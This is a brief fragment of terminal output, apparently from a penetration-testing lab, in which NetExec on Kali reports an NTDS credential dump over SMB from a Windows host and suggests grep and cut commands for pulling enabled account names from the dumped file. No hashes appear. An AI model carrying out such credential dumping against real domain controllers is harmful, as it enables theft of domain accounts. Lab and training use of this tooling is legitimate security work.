+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  [*] To extract only enabled accounts from the output file, run the following command:
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  [*] cat /home/kali/.nxc/logs/ntds/10.10.234.39_None_2025-09-23_100808.ntds | grep -iv disabled | cut -d ':' -f1
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  [*] grep -iv disabled /home/kali/.nxc/logs/ntds/10.10.234.39_None_2025-09-23_100808.ntds | cut -d ':' -f1
+
+┌──(kali㉿kali)-[~]
+└─$
